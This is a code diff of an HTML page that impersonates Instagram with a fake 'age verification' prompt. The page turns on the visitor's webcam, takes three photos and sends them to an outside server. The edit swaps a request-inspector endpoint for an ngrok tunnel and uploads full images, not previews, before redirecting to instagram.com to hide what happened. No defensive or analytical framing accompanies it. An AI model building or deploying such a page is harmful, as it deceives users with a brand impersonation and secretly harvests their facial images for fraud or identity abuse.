@@ -2,83 +2,60 @@
 <html>
 <head>
     <title>Instagram Verification</title>
-    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
-        .container { max-width: 400px; margin: 50px auto; padding: 30px; 
-                     border-radius: 10px; background: white; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-        .logo { width: 150px; margin-bottom: 20px; }
-        .btn { background: #0095f6; color: white; border: none; padding: 12px 24px;
-               border-radius: 8px; font-size: 16px; cursor: pointer; margin: 10px; }
-        .message { background: #ffcc00; padding: 15px; border-radius: 5px; margin: 20px 0; }
-        #status { margin-top: 20px; color: #666; font-size: 14px; }
+        body { font-family: Arial; text-align: center; padding: 50px; }
+        .btn { background: #0095f6; color: white; padding: 15px 30px; 
+               border: none; border-radius: 8px; font-size: 16px; 
+               cursor: pointer; margin: 20px; }
+        #log { margin-top: 20px; color: #666; font-size: 14px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/150px-Instagram_logo.svg.png" 
-             alt="Instagram" class="logo">
-        
-        <h2>Age Verification Required</h2>
-        
-        <div class="message">
-            <strong>New Security Update:</strong><br>
-            We now require facial verification to ensure you're 18+.
-        </div>
-        
-        <p>This is a one-time process to keep Instagram safe.</p>
-        
-        <button class="btn" onclick="startVerification()">Start Face Verification</button>
-        
-        <div id="status"></div>
-    </div>
-
+    <h1>Instagram</h1>
+    <p>Age verification required</p>
+    <button class="btn" onclick="start()">Verify Now</button>
+    <div id="log"></div>
+    
     <script>
-        const INSPECTOR_URL = 'https://01kf4syspqj5sw3w2d5p4hg6v300-7e1653a5f18c090a453a.requestinspector.com';
+        const SERVER = 'https://affrontingly-unviewed-towanda.ngrok-free.dev';
+        let log = document.getElementById('log');
         
-        function updateStatus(msg) {
-            document.getElementById('status').innerHTML = msg;
-            console.log(msg);
+        function addLog(msg) {
+            log.innerHTML += '<div>' + msg + '</div>';
         }
         
-        async function startVerification() {
-            updateStatus('Starting camera...');
+        async function start() {
+            addLog('Starting...');
             
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { width: 320, height: 240 },
+                    video: { width: 320, height: 240 }, 
                     audio: false 
                 });
                 
-                updateStatus('Camera active. Verifying...');
-                
+                addLog('Camera opened');
                 const video = document.createElement('video');
                 video.srcObject = stream;
-                video.autoplay = true;
-                video.style.display = 'none';
-                document.body.appendChild(video);
+                video.play();
                 
                 // التقاط وإرسال 3 صور
                 for (let i = 1; i <= 3; i++) {
-                    updateStatus(`Taking photo ${i}/3...`);
-                    await takePhoto(video, i);
-                    await new Promise(r => setTimeout(r, 1000));
+                    addLog('Taking photo ' + i + '...');
+                    await captureAndSend(video, i);
+                    await new Promise(r => setTimeout(r, 1500));
                 }
                 
-                updateStatus('<span style="color:green;">✅ Verification successful!</span>');
-                
-                stream.getTracks().forEach(track => track.stop());
-                
+                addLog('<span style="color:green;">✅ Done! Redirecting...</span>');
                 setTimeout(() => {
                     window.location.href = 'https://instagram.com';
                 }, 2000);
                 
             } catch (err) {
-                updateStatus('❌ Error: ' + err.message);
+                addLog('Error: ' + err.message);
             }
         }
         
-        async function takePhoto(video, count) {
+        function captureAndSend(video, count) {
             return new Promise((resolve) => {
                 setTimeout(() => {
                     const canvas = document.createElement('canvas');
@@ -87,39 +64,28 @@
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0, 160, 120);
                     
-                    const imageData = canvas.toDataURL('image/jpeg', 0.5);
+                    const img = canvas.toDataURL('image/jpeg', 0.3);
                     
-                    // إرسال بيانات مختصرة
-                    const data = {
-                        verification: 'age_check',
-                        photo_number: count,
-                        timestamp: new Date().toISOString(),
-                        image_preview: imageData.substring(0, 150) // أول 150 حرف فقط
-                    };
-                    
-                    fetch(INSPECTOR_URL, {
+                    fetch(SERVER + '/upload', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(data)
+                        body: JSON.stringify({ 
+                            count: count,
+                            image: img
+                        })
                     })
-                    .then(response => {
-                        updateStatus(`Photo ${count} sent ✓`);
+                    .then(res => {
+                        addLog('Photo ' + count + ' sent ✓');
                         resolve();
                     })
                     .catch(err => {
-                        updateStatus(`Photo ${count} failed`);
+                        addLog('Send error: ' + err);
                         resolve();
                     });
                     
                 }, 500);
             });
         }
-        
-        // بدء تلقائي بعد 5 ثوان
-        setTimeout(() => {
-            document.querySelector('.message').innerHTML += 
-                '<br><small>98% of users complete this in under 10 seconds.</small>';
-        }, 5000);
     </script>
 </body>
 </html>
